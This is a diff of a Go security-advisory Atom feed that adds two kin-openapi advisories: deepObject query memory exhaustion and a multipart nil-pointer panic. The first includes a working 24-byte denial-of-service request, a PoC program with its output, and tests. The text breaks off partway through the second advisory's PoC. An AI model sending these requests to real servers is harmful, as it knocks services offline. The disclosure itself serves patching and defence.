@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-21T20:13:00.016Z</updated>
+    <updated>2026-08-21T21:12:36.255Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,736 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getkin/kin-openapi] kin-openapi has uncontrolled resource consumption in openapi3filter deepObject query parameter decoding]]></title>
+        <id>https://github.com/advisories/GHSA-xhj3-7xw9-vr34</id>
+        <link href="https://github.com/advisories/GHSA-xhj3-7xw9-vr34"/>
+        <updated>2026-08-21T20:56:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An uncontrolled resource consumption vulnerability in <code>openapi3filter</code> lets any unauthenticated client force multi-gigabyte heap allocation with a single, tiny HTTP request. When a spec declares a <code>deepObject</code>-style query parameter whose schema contains an array (a normal, documented pattern), the decoder reconstructs the array by reading the <strong>largest attacker-supplied index</strong> and allocating one slot for every position from <code>0</code> up to that index — <em>before</em> schema validation (including <code>maxItems</code>) ever runs. A request as small as 24 bytes (<code>?param[items][50000000]=x</code>) drives heap allocation to <strong>~6.1 GiB</strong>, reliably triggering an OOM kill / restart loop on memory-constrained services.</p>
+<h3 id="details">Details</h3>
+<p>The OpenAPI <code>style: deepObject</code> serialization lets clients express arrays in the query string using bracket notation, e.g. <code>param[items][0]=a&amp;param[items][1]=b</code>. The decoder first collects these into an intermediate <code>map[string]any</code> keyed by the string of the index, then converts that sparse map into a real <code>[]any</code> in <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L936"><code>sliceMapToSlice</code></a>:</p>
+<pre><code class="language-go">// req_resp_decoder.go (vulnerable version)
+func sliceMapToSlice(m map[string]any) ([]any, error) {
+    var result []any
+    keys := make([]int, 0, len(m))
+    for k := range m {
+        key, err := strconv.Atoi(k)          // "50000000" -&gt; 50000000, attacker-controlled
+        if err != nil {
+            return nil, fmt.Errorf("array indexes must be integers: %w", err)
+        }
+        keys = append(keys, key)
+    }
+    max := -1
+    for _, k := range keys {
+        if k &gt; max {
+            max = k                          // max = attacker's index, unbounded
+        }
+    }
+    for i := 0; i &lt;= max; i++ {              // &lt;-- unbounded loop, 0 .. max
+        val, ok := m[strconv.Itoa(i)]
+        if !ok {
+            result = append(result, nil)     // fills every sparse hole with nil
+            continue
+        }
+        result = append(result, val)
+    }
+    return result, nil
+}
+</code></pre>
+<p>A second, equally-sized allocation follows immediately in <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L986"><code>buildResObj</code></a>:</p>
+<pre><code class="language-go">resultArr := make([]any /*not 0,*/, len(arr))   // second allocation, size = max+1
+for i := range arr {
+    r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items)
+    ...
+}
+</code></pre>
+<p>So a single attacker-chosen integer <code>N</code> produces an <code>append</code>-grown <code>[]any</code> of length <code>N+1</code>, a second <code>make([]any, N+1)</code>, and <code>N+1</code> recursion steps — with <strong>no upper bound</strong> other than <code>strconv.Atoi</code>'s <code>int</code> range (~9.2×10¹⁸ on 64-bit) and available memory.</p>
+<p><strong>Why <code>maxItems</code> does not help.</strong> <code>maxItems</code> is enforced by schema <em>validation</em>, which runs strictly after parameter <em>decoding</em> completes. <code>sliceMapToSlice</code>/<code>buildResObj</code> fully materialize the oversized array first; validation only inspects — and rejects — the already-allocated result. The PoC below demonstrates this ordering directly: the returned error is the <code>maxItems</code> violation, proving the allocation happened before it could be prevented.</p>
+<p><strong>Why this is deepObject-specific.</strong> Every other array-bearing surface was driven with an equivalent large-index/large-array payload and stayed under ~27 KiB: <code>application/json</code> bodies build arrays element-by-element from the literal (no "index" concept to inflate); <code>x-www-form-urlencoded</code> and <code>multipart/form-data</code> arrays are sized by the number of repeated fields actually sent; and the other <code>makeObject</code> call sites (path/<code>simple</code>, header/<code>simple</code>, cookie/<code>form</code>, at <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L479"><code>:479</code></a>, <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L777"><code>:777</code></a>, <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L841"><code>:841</code></a>) build their intermediate map via <code>propsFromString</code>, which splits on delimiters and produces property-name keys, never bracketed integer indexes. Only the deepObject <code>propsFn</code> (<a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L661"><code>:661-687</code></a>) synthesizes the bracketed integer keys that reach <code>sliceMapToSlice</code> with an attacker-controlled magnitude.</p>
+<p><strong>Preconditions.</strong> The target spec needs a query parameter with <code>in: query</code>, <code>style: deepObject</code> (typically <code>explode: true</code>), and a schema whose graph contains at least one <code>type: array</code>. This is an entirely normal, author-written spec — it is exactly the pattern the library's own decoder tests exercise. No hostile spec authoring is required, and the attack works regardless of any <code>maxItems</code> constraint on the array.</p>
+<p><strong>Introduced in.</strong> <code>sliceMapToSlice</code>, including the unbounded <code>0..max</code> fill loop, was added whole-cloth in commit <a href="https://github.com/getkin/kin-openapi/commit/78bb273e5892da3b0c8fc31857499449adfaba6c"><code>78bb273</code></a> ("openapi3filter: deepObject array of objects and array of arrays support (#923)", merged 2024-03-22), which first shipped in <strong><code>v0.124.0</code></strong>. Every tagged release from <code>v0.124.0</code> through the current <code>v0.141.0</code> / <code>master</code> (<code>1d0a337</code>) contains the vulnerable code path.</p>
+<h3 id="poc">PoC</h3>
+<p>Verified against revision <code>1d0a337c9b1570fab283be8a04c8af6e43b9a22c</code> (<code>v0.141.0</code>, current <code>master</code> at the time of writing), Go 1.25.0, <code>darwin/arm64</code>.</p>
+<p><strong>1. Spec</strong> — one operation accepting a <code>deepObject</code> query parameter whose <code>items</code> property is an array (<code>maxItems: 3</code> is declared deliberately, to prove it does not help):</p>
+<pre><code class="language-yaml">openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /q:
+    get:
+      parameters:
+        - name: param
+          in: query
+          style: deepObject
+          explode: true
+          schema:
+            type: object
+            properties:
+              items:
+                type: array
+                maxItems: 3
+                items: {type: string}
+      responses:
+        '200': {description: ok}
+</code></pre>
+<p><strong>2. Program</strong> — build a request with a single huge array index and measure heap allocation across the same public entry point (<code>gorillamux</code> router → <code>openapi3filter.ValidateRequest</code>) any real HTTP server uses:</p>
+<pre><code class="language-go">package main
+
+import (
+    "context"
+    "fmt"
+    "net/http"
+    "runtime"
+
+    "github.com/getkin/kin-openapi/openapi3"
+    "github.com/getkin/kin-openapi/openapi3filter"
+    "github.com/getkin/kin-openapi/routers/gorillamux"
+)
+
+const spec = `
+openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /q:
+    get:
+      parameters:
+        - name: param
+          in: query
+          style: deepObject
+          explode: true
+          schema:
+            type: object
+            properties:
+              items:
+                type: array
+                maxItems: 3
+                items: {type: string}
+      responses:
+        '200': {description: ok}
+`
+
+func main() {
+    loader := openapi3.NewLoader()
+    doc, _ := loader.LoadFromData([]byte(spec))
+    _ = doc.Validate(loader.Context)
+    router, _ := gorillamux.NewRouter(doc)
+
+    // Attacker-controlled index. A 24-byte query string is enough to force
+    // materialization of a 50-million-element slice.
+    const rawQuery = "param[items][50000000]=x"
+
+    r, _ := http.NewRequest(http.MethodGet, "/q?"+rawQuery, nil)
+    route, pp, _ := router.FindRoute(r)
+
+    var before, after runtime.MemStats
+    runtime.GC()
+    runtime.ReadMemStats(&amp;before)
+
+    err := openapi3filter.ValidateRequest(context.Background(), &amp;openapi3filter.RequestValidationInput{
+        Request: r, PathParams: pp, Route: route,
+        Options: &amp;openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+    })
+
+    runtime.ReadMemStats(&amp;after)
+
+    fmt.Printf("query string: %q (%d bytes)\n", rawQuery, len(rawQuery))
+    fmt.Printf("heap allocated during ValidateRequest: %.1f MiB\n", float64(after.TotalAlloc-before.TotalAlloc)/(1&lt;&lt;20))
+    fmt.Printf("ValidateRequest error: %v\n", err)
+}
+</code></pre>
+<p><strong>3. Observed output</strong> (<code>go run .</code>, unpatched tree, re-verified in this pass):</p>
+<pre><code>query string: "param[items][50000000]=x" (24 bytes)
+heap allocated during ValidateRequest: 6231.1 MiB
+ValidateRequest error: parameter "param" in query has an error: Error at "/items": maximum number of items is 3
+</code></pre>
+<p>A <strong>24-byte query string drove ~6.1 GiB of heap allocation</strong> in a single call, and the returned error is the <code>maxItems</code> rejection — proof that the array was fully materialized <em>before</em> validation could reject it. Scaling the index shows the amplification is linear and attacker-tunable (measured over several runs on this revision):</p>
+<table>
+<thead>
+<tr>
+<th>Query string</th>
+<th>Wire size</th>
+<th>Heap allocated</th>
+<th>Amplification</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>param[items][10000]=x</code></td>
+<td>21 B</td>
+<td>0.9 MiB</td>
+<td>~44,000×</td>
+</tr>
+<tr>
+<td><code>param[items][100000]=x</code></td>
+<td>22 B</td>
+<td>11.1 MiB</td>
+<td>~529,000×</td>
+</tr>
+<tr>
+<td><code>param[items][1000000]=x</code></td>
+<td>23 B</td>
+<td>114 MiB</td>
+<td>~5,200,000×</td>
+</tr>
+<tr>
+<td><code>param[items][5000000]=x</code></td>
+<td>23 B</td>
+<td>555 MiB</td>
+<td>~25,300,000×</td>
+</tr>
+<tr>
+<td><code>param[items][50000000]=x</code></td>
+<td>24 B</td>
+<td><strong>6.1 GiB</strong></td>
+<td>~272,000,000×</td>
+</tr>
+</tbody></table>
+<p><strong>Attack request</strong> (nothing else required — no body, no auth, no unusual headers):</p>
+<pre><code>GET /whatever?param[items][50000000]=x HTTP/1.1
+Host: victim
+</code></pre>
+<p><strong>Control (confirms only deepObject is a vector):</strong> repeating the equivalent "large array" attempt against <code>application/json</code>, <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code> bodies, and non-deepObject <code>path</code>/<code>header</code>/<code>cookie</code> styles stays under ~27 KiB in every case.</p>
+<p><strong>4. Regression/scaling test suite</strong> — a broader harness driving the same public entry point, adding the ordering proof (<code>TestC02_AllocationBeforeValidation</code>), the nested-index amplifier, and the cross-encoding controls referenced above. Save as <code>openapi3filter/zzz_c02_verify_test.go</code> and run with <code>C02_BIG=1 go test -run TestC02 ./openapi3filter/ -v</code> (unset <code>C02_BIG</code> to skip the two largest, slower indexes):</p>
+<pre><code class="language-go">package openapi3filter_test
+
+import (
+    "bytes"
+    "fmt"
+    "mime/multipart"
+    "net/http"
+    "net/url"
+    "os"
+    "runtime"
+    "strings"
+    "testing"
+
+    "github.com/stretchr/testify/require"
+
+    "github.com/getkin/kin-openapi/openapi3"
+    "github.com/getkin/kin-openapi/openapi3filter"
+    "github.com/getkin/kin-openapi/routers/gorillamux"
+)
+
+// measureAlloc runs fn and reports the number of bytes of heap it caused to be
+// allocated (TotalAlloc delta), which counts even memory that was already freed
+// by the time fn returned. This captures transient allocation spikes.
+func measureAlloc(fn func()) uint64 {
+    var before, after runtime.MemStats
+    runtime.GC()
+    runtime.ReadMemStats(&amp;before)
+    fn()
+    runtime.ReadMemStats(&amp;after)
+    return after.TotalAlloc - before.TotalAlloc
+}
+
+const c02Spec = `
+openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /q:
+    get:
+      parameters:
+        - name: param
+          in: query
+          style: deepObject
+          explode: true
+          schema:
+            type: object
+            properties:
+              items:
+                type: array
+                maxItems: 3
+                items: {type: string}
+      responses:
+        '200': {description: ok}
+`
+
+func c02Router(t *testing.T) (*openapi3.T, func(rawquery string) error) {
+    t.Helper()
+    loader := openapi3.NewLoader()
+    ctx := loader.Context
+    doc, err := loader.LoadFromData([]byte(c02Spec))
+    require.NoError(t, err)
+    require.NoError(t, doc.Validate(ctx))
+    router, err := gorillamux.NewRouter(doc)
+    require.NoError(t, err)
+
+    validate := func(rawquery string) error {
+        req, err := http.NewRequest(http.MethodGet, "/q?"+rawquery, nil)
+        require.NoError(t, err)
+        route, pathParams, err := router.FindRoute(req)
+        require.NoError(t, err)
+        return openapi3filter.ValidateRequest(ctx, &amp;openapi3filter.RequestValidationInput{
+            Request:    req,
+            PathParams: pathParams,
+            Route:      route,
+            Options:    &amp;openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+        })
+    }
+    return doc, validate
+}
+
+// TestC02_Reproduce_MemoryExhaustion measures the allocation caused by a single
+// tiny deepObject query with a large array index.
+func TestC02_Reproduce_MemoryExhaustion(t *testing.T) {
+    _, validate := c02Router(t)
+
+    base := measureAlloc(func() {
+        _ = validate("param[items][0]=a&amp;param[items][1]=b&amp;param[items][2]=c")
+    })
+    t.Logf("baseline (3 legit items): %s allocated", humanBytes(base))
+
+    indexes := []int{10_000, 100_000, 1_000_000}
+    if os.Getenv("C02_BIG") == "1" {
+        indexes = append(indexes, 5_000_000, 50_000_000)
+    }
+
+    const fixThreshold = 32 &lt;&lt; 20 // 32 MiB: no fixed-tree request should approach this
+    worst := uint64(0)
+    for _, idx := range indexes {
+        q := fmt.Sprintf("param[items][%d]=x", idx)
+        alloc := measureAlloc(func() {
+            err := validate(q)
+            require.Error(t, err) // rejected either by the cap (fixed) or maxItems (vuln)
+        })
+        if alloc &gt; worst {
+            worst = alloc
+        }
+        ratio := float64(alloc) / float64(len(q))
+        t.Logf("index=%-10d query=%dB -&gt; %s allocated (%.0fx over the query size)",
+            idx, len(q), humanBytes(alloc), ratio)
+    }
+    require.Less(t, worst, uint64(fixThreshold),
+        "C-02 REGRESSION: a tiny deepObject query allocated %s; the sliceMapToSlice cap is missing or too high",
+        humanBytes(worst))
+}
+
+// TestC02_AllocationBeforeValidation checks the ordering: on the vulnerable
+// tree the huge allocation happened even though maxItems:3 is declared, proving
+// materialization precedes schema validation.
+func TestC02_AllocationBeforeValidation(t *testing.T) {
+    _, validate := c02Router(t)
+
+    const idx = 2_000_000
+    q := fmt.Sprintf("param[items][%d]=x", idx)
+
+    var gotErr error
+    alloc := measureAlloc(func() {
+        gotErr = validate(q)
+    })
+    require.Error(t, gotErr)
+    t.Logf("index=%d (query %d bytes) allocated %s; error: %v",
+        idx, len(q), humanBytes(alloc), gotErr)
+
+    // On the vulnerable tree this value was ~225 MiB and this assertion fails,
+    // flagging the regression. On the fixed tree it stays well under 32 MiB.
+    require.Less(t, alloc, uint64(32&lt;&lt;20),
+        "C-02 REGRESSION: index %d allocated %s before rejection", idx, humanBytes(alloc))
+}
+
+// TestC02_OnlyDeepObjectAffected proves the blast radius: JSON, multipart, and
+// urlencoded array handling do NOT go through sliceMapToSlice, so an equivalent
+// "large index" payload in those encodings does not explode.
+func TestC02_OnlyDeepObjectAffected(t *testing.T) {
+    spec := `
+openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /b:
+    post:
+      requestBody:
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                items: {type: array, maxItems: 3, items: {type: string}}
+          application/x-www-form-urlencoded:
+            schema:
+              type: object
+              properties:
+                items: {type: array, maxItems: 3, items: {type: string}}
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                items: {type: array, maxItems: 3, items: {type: string}}
+      responses:
+        '200': {description: ok}
+`
+    loader := openapi3.NewLoader()
+    ctx := loader.Context
+    doc, err := loader.LoadFromData([]byte(spec))
+    require.NoError(t, err)
+    require.NoError(t, doc.Validate(ctx))
+    router, err := gorillamux.NewRouter(doc)
+    require.NoError(t, err)
+
+    do := func(ct, body string) (error, uint64) {
+        var e error
+        alloc := measureAlloc(func() {
+            req, _ := http.NewRequest(http.MethodPost, "/b", strings.NewReader(body))
+            req.Header.Set("Content-Type", ct)
+            route, pathParams, rerr := router.FindRoute(req)
+            require.NoError(t, rerr)
+            e = openapi3filter.ValidateRequest(ctx, &amp;openapi3filter.RequestValidationInput{
+                Request: req, PathParams: pathParams, Route: route,
+                Options: &amp;openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+            })
+        })
+        return e, alloc
+    }
+
+    _, jsonAlloc := do("application/json", `{"items":["a","b","c","d"]}`)
+    t.Logf("JSON 4-elem array: %s", humanBytes(jsonAlloc))
+    require.Less(t, jsonAlloc, uint64(4&lt;&lt;20), "JSON path must not balloon")
+
+    form := url.Values{}
+    form.Set("items", "a")
+    form.Add("items", "b")
+    _, formAlloc := do("application/x-www-form-urlencoded", form.Encode())
+    t.Logf("urlencoded repeated field: %s", humanBytes(formAlloc))
+    require.Less(t, formAlloc, uint64(4&lt;&lt;20), "urlencoded path must not balloon")
+
+    var buf bytes.Buffer
+    w := multipart.NewWriter(&amp;buf)
+    require.NoError(t, w.WriteField("items", "a"))
+    require.NoError(t, w.WriteField("items", "b"))
+    require.NoError(t, w.Close())
+    _, mpAlloc := do(w.FormDataContentType(), buf.String())
+    t.Logf("multipart fields: %s", humanBytes(mpAlloc))
+    require.Less(t, mpAlloc, uint64(4&lt;&lt;20), "multipart path must not balloon")
+}
+
+// TestC02_NonDeepObjectStylesSafe checks the other makeObject entry points
+// (path/simple, header/simple, cookie/form). These build props via
+// propsFromString, whose keys are property names, not bracketed integer
+// indexes -- so a big number lands as a string key that fails strconv.Atoi
+// cleanly, without materializing a giant slice.
+func TestC02_NonDeepObjectStylesSafe(t *testing.T) {
+    spec := `
+openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /p/{param}:
+    get:
+      parameters:
+        - name: param
+          in: path
+          required: true
+          style: simple
+          explode: false
+          schema:
+            type: object
+            properties:
+              items: {type: array, maxItems: 3, items: {type: string}}
+      responses:
+        '200': {description: ok}
+`
+    loader := openapi3.NewLoader()
+    ctx := loader.Context
+    doc, err := loader.LoadFromData([]byte(spec))
+    require.NoError(t, err)
+    require.NoError(t, doc.Validate(ctx))
+    router, err := gorillamux.NewRouter(doc)
+    require.NoError(t, err)
+
+    alloc := measureAlloc(func() {
+        req, _ := http.NewRequest(http.MethodGet, "/p/items,5000000", nil)
+        route, pathParams, rerr := router.FindRoute(req)
+        require.NoError(t, rerr)
+        _ = openapi3filter.ValidateRequest(ctx, &amp;openapi3filter.RequestValidationInput{
+            Request: req, PathParams: pathParams, Route: route,
+            Options: &amp;openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+        })
+    })
+    t.Logf("path/simple object with big scalar: %s", humanBytes(alloc))
+    require.Less(t, alloc, uint64(4&lt;&lt;20), "path/simple must not balloon")
+}
+
+func humanBytes(b uint64) string {
+    const unit = 1024
+    if b &lt; unit {
+        return fmt.Sprintf("%d B", b)
+    }
+    div, exp := uint64(unit), 0
+    for n := b / unit; n &gt;= unit; n /= unit {
+        div *= unit
+        exp++
+    }
+    return fmt.Sprintf("%.1f %ciB", float64(b)/float64(div), "KMGTPE"[exp])
+}
+</code></pre>
+<p><strong>Observed output re-run in this pass</strong> (<code>C02_BIG=1 go test -run TestC02 ./openapi3filter/ -v</code>):</p>
+<ul>
+<li><strong>Unpatched tree</strong> (fix reverted via <code>git stash push -- openapi3filter/req_resp_decoder.go</code>): <code>TestC02_Reproduce_MemoryExhaustion</code> reproduced the full scaling table above (10,000 → 937.5 KiB through 50,000,000 → 6.1 GiB), and <code>TestC02_AllocationBeforeValidation</code> measured <strong>225.2 MiB</strong> allocated for <code>index=2,000,000</code> before the <code>maxItems</code> rejection fired — both matching the standalone PoC's findings and failing their bounded-allocation assertions as expected.</li>
+<li><strong>Patched tree</strong> (fix restored): all five tests pass; the worst-case allocation across every index, including 50,000,000, drops to 51.1 KiB, and <code>TestC02_OnlyDeepObjectAffected</code> / <code>TestC02_NonDeepObjectStylesSafe</code> confirm the other encodings and parameter styles were never affected.</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Type:</strong> Uncontrolled Resource Consumption (CWE-789, Memory Allocation with Excessive Size Value / CWE-400, Uncontrolled Resource Consumption) → <strong>unauthenticated remote denial of service</strong>.</li>
+<li><strong>Who is impacted:</strong> any application using <code>github.com/getkin/kin-openapi/openapi3filter</code> to validate requests against a spec that declares an <code>in: query</code>, <code>style: deepObject</code> parameter whose schema contains an array anywhere in its property graph. This is a normal, documented OpenAPI pattern, not a hostile or unusual spec.</li>
+<li><strong>Attack:</strong> a single unauthenticated <code>GET</code> request with a small, attacker-chosen query string (as few as ~21–24 bytes). No body, no credentials, no special client tooling, no chunked-encoding or <code>Content-Length</code> trickery — the trigger lives entirely in the query string, so request-body size limits do not mitigate it.</li>
+<li><strong>Consequence:</strong> a single request can force hundreds of megabytes to multiple gigabytes of heap allocation; a handful of concurrent requests reliably exhausts memory on typical container limits (256 MB–2 GB), producing an OOM kill / restart loop. The declared <code>maxItems</code> constraint on the array does <strong>not</strong> prevent this, because materialization happens during decoding, strictly before schema validation runs.</li>
+<li><strong>Not affected:</strong> specs that do not use <code>style: deepObject</code> for array-bearing query parameters; requests via <code>application/json</code>, <code>x-www-form-urlencoded</code>, or <code>multipart/form-data</code> bodies; and <code>path</code>/<code>header</code>/<code>cookie</code> styled object parameters (all verified empirically above, and re-verified in this pass).</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-xhj3-7xw9-vr34">https://github.com/getkin/kin-openapi/security/advisories/GHSA-xhj3-7xw9-vr34</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/commit/1223a0f215d2cf9beb2d9eb9ea2649d001c21388">https://github.com/getkin/kin-openapi/commit/1223a0f215d2cf9beb2d9eb9ea2649d001c21388</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/releases/tag/v0.142.0">https://github.com/getkin/kin-openapi/releases/tag/v0.142.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-xhj3-7xw9-vr34">https://github.com/advisories/GHSA-xhj3-7xw9-vr34</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xhj3-7xw9-vr34</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-21T20:56:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getkin/kin-openapi] kin-openapi openai3filter: nil-pointer panic in ConvertErrors on malformed multipart/form-data body enables unauthenticated DoS]]></title>
+        <id>https://github.com/advisories/GHSA-mmfr-pmjx-hw9w</id>
+        <link href="https://github.com/advisories/GHSA-mmfr-pmjx-hw9w"/>
+        <updated>2026-08-21T20:55:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A nil-pointer dereference in <code>openapi3filter.ConvertErrors</code> lets any unauthenticated client crash a server with a single HTTP request. When an application validates a <code>multipart/form-data</code> request body and renders the resulting validation error through the library-provided <code>ValidationErrorEncoder</code> / <code>ConvertErrors</code> helpers, a malformed scalar form field (e.g. a non-numeric value for an <code>integer</code> property) produces an error shape that <code>convertParseError</code> dereferences without a nil check. The handler goroutine panics, causing a denial of service. <code>application/json</code> request bodies are <strong>not</strong> affected — the bug is specific to <code>multipart/form-data</code>.</p>
+<h3 id="details">Details</h3>
+<p>The panic is in <code>convertParseError</code>, at <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L119"><code>openapi3filter/validation_error_encoder.go:119-120</code></a> (still present on <code>master</code> at the time of writing):</p>
+<pre><code class="language-go">} else if innerErr.RootCause() != nil {
+    if rootErr, ok := innerErr.Cause.(*ParseError); ok &amp;&amp;
+        rootErr.Kind == KindInvalidFormat &amp;&amp; e.Parameter.In == "query" {   // ❌ e.Parameter may be nil → panic
+</code></pre>
+<p>The comparison <code>e.Parameter.In == "query"</code> assumes <code>e.Parameter</code> is non-nil. It is reached whenever <strong>both</strong> of the following hold:</p>
+<ol>
+<li><strong><code>e.Parameter == nil</code>.</strong> A <code>*RequestError</code> carries <em>either</em> <code>Parameter</code> (parameter errors) <em>or</em> <code>RequestBody</code> (body errors), never both. <code>ValidateRequestBody</code> builds body errors with only <code>RequestBody</code> set, leaving <code>Parameter</code> nil — see <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validate_request.go#L326"><code>validate_request.go:326-332</code></a>.</li>
+<li><strong><code>innerErr.Cause</code> is itself a <code>*ParseError</code></strong> (a <code>ParseError</code> nested inside a <code>ParseError</code>), so the type assertion on line 119 succeeds and execution reaches the <code>e.Parameter.In</code> dereference on line 120.</li>
+</ol>
+<p>The only default code path that satisfies <em>both</em> conditions is the <strong>multipart</strong> body decoder, which wraps a failed part's <code>*ParseError</code> inside another <code>*ParseError</code> at <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L1549"><code>req_resp_decoder.go:1549</code></a> and <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L1558"><code>:1558</code></a>:</p>
+<pre><code class="language-go">if v, ok := err.(*ParseError); ok {
+    return nil, &amp;ParseError{path: []any{name}, Cause: v}   // v is a *ParseError → nested
+}
+</code></pre>
+<p>Why other paths do <strong>not</strong> reach the dereference:</p>
+<table>
+<thead>
+<tr>
+<th>Body content type</th>
+<th>Failure mode</th>
+<th><code>RequestError.Err</code> shape</th>
+<th><code>.Cause</code> is <code>*ParseError</code>?</th>
+<th><code>e.Parameter</code></th>
+<th>Panics?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>multipart/form-data</code></strong></td>
+<td>scalar part fails primitive parse (<code>age=notanumber</code>)</td>
+<td><code>*ParseError</code> wrapping a <code>*ParseError</code></td>
+<td><strong>yes</strong></td>
+<td><code>nil</code></td>
+<td><strong>YES</strong></td>
+</tr>
+<tr>
+<td><code>application/json</code></td>
+<td>malformed JSON syntax</td>
+<td><code>*ParseError</code> whose <code>.Cause</code> is an <code>encoding/json</code> error</td>
+<td>no (assertion fails → safe fallback branch)</td>
+<td><code>nil</code></td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>application/json</code></td>
+<td>wrong type / schema violation</td>
+<td><code>*openapi3.SchemaError</code> (routed to <code>convertSchemaError</code>, never reaches <code>convertParseError</code>)</td>
+<td>n/a</td>
+<td><code>nil</code></td>
+<td>no</td>
+</tr>
+<tr>
+<td>styled <code>query</code> / <code>path</code> params</td>
+<td>invalid format</td>
+<td><code>*ParseError</code> wrapping a <code>*ParseError</code></td>
+<td>yes</td>
+<td><strong>set (non-nil)</strong></td>
+<td>no (guard/assignment succeeds)</td>
+</tr>
+</tbody></table>
+<p>Note that the sibling <code>"path"</code> branch two lines above (<a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L108">line 108</a>) already guards correctly with <code>e.Parameter != nil</code>; the <code>"query"</code> branch simply omits the same guard.</p>
+<p><strong>Recommended fix.</strong> Add the missing nil guard to the condition:</p>
+<pre><code class="language-diff">         if rootErr, ok := innerErr.Cause.(*ParseError); ok &amp;&amp;
+-			rootErr.Kind == KindInvalidFormat &amp;&amp; e.Parameter.In == "query" {
++			rootErr.Kind == KindInvalidFormat &amp;&amp; e.Parameter != nil &amp;&amp; e.Parameter.In == "query" {
+</code></pre>
+<p>When <code>e.Parameter == nil</code> the inner <code>if</code> is skipped and control falls through to the existing <code>return &amp;ValidationError{Status: http.StatusBadRequest, Title: innerErr.Reason}</code> at <a href="https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L127">line 127-130</a> — a correct <code>400 Bad Request</code>. I verified that applying only this one-line guard stops the panic and returns <code>*ValidationError{Status: 400}</code>.</p>
+<p>Minor follow-up worth including in the same change: for the multipart nested <code>*ParseError</code>, the <em>outer</em> <code>ParseError.Reason</code> is empty, so the fallback <code>Title: innerErr.Reason</code> yields a <code>400</code> with an <strong>empty <code>Title</code></strong>. The descriptive text lives in <code>innerErr.Error()</code> (e.g. <code>"path age: value notanumber: an invalid integer: invalid syntax"</code>). Prefer a non-empty fallback:</p>
+<pre><code class="language-go">title := innerErr.Reason
+if title == "" {
+    title = innerErr.Error()
+}
+return &amp;ValidationError{Status: http.StatusBadRequest, Title: title}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>Verified against revision <code>98d956447b64eaa10d3570a80b3be1a2849945f1</code> (also reproducible on current <code>master</code>), Go 1.25.0.</p>
+<p><strong>1. Spec</strong> — one operation accepting a <code>multipart/form-data</code> body with a non-string scalar (<code>integer</code>) property:</p>
+<pre><code class="language-yaml">openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /upload:
+    post:
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                age: {type: integer}
+      responses:
+        '200': {description: ok}
+</code></pre>
+<p><strong>2. Program</strong> — validate a request whose <code>age</code> part is non-numeric, then convert the error the way a typical error-rendering middleware does:</p>
+<pre><code class="language-go">package main
+
+import (
+    "bytes"
+    "context"
+    "fmt"
+    "mime/multipart"
+    "net/http"
+
+    "github.com/getkin/kin-openapi/openapi3"
+    "github.com/getkin/kin-openapi/openapi3filter"
+    "github.com/getkin/kin-openapi/routers/gorillamux"
+)
+
+const spec = `
+openapi: '3.0.3'
+info: {title: t, version: '1.0.0'}
+paths:
+  /upload:
+    post:
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                age: {type: integer}
+      responses:
+        '200': {description: ok}
